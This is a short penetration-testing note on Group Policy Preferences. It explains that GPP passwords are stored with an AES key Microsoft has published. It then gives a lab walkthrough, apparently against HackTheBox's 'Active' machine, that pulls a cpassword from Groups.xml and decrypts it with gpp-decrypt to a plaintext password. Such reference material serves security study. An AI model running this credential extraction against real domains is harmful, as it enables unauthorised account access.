---
id: Group Policy
aliases: []
tags:
  - Microsoft/Windows/General/Group-Policy
links: "[[General]]"
---

# Group Policy

___

<!-- Group Policy Preferences {{{-->
## Group Policy Preferences

**Group Policy Preferences**
(*[GPP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-preferences)*)
(*introduced in Windows Server 2008*)
enhance Group Policy by allowing administrators
to configure additional settings beyond standard policy options

The defined password [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
encrypted and stored in `/MACHINE/Preferences/Groups/Groups.xml`

In 2012, [Microsoft published the AES key on MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
meaning that passwords set using GPP are now trivial to crack

[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) -
Parse the Group Policy Preferences XML file which extracts the username and decrypts the cpassword attribute

```sh
gpp-decrypt <cpassword>
```

<!-- Example {{{-->
> [!example]-
>
> 1. Extract `userName`
>
> ```sh
> userName="active.htb\SVC_TGS"
> ```
>
> 2. Extract `cpassword`
>
> ```xml
> cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
> ```
>
> 3. Crack GPP password
>
> ```sh
> gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
> ```
> ```sh
> GPPstillStandingStrong2k18
> ```
>
<!-- }}} -->

___
<!-- }}} -->
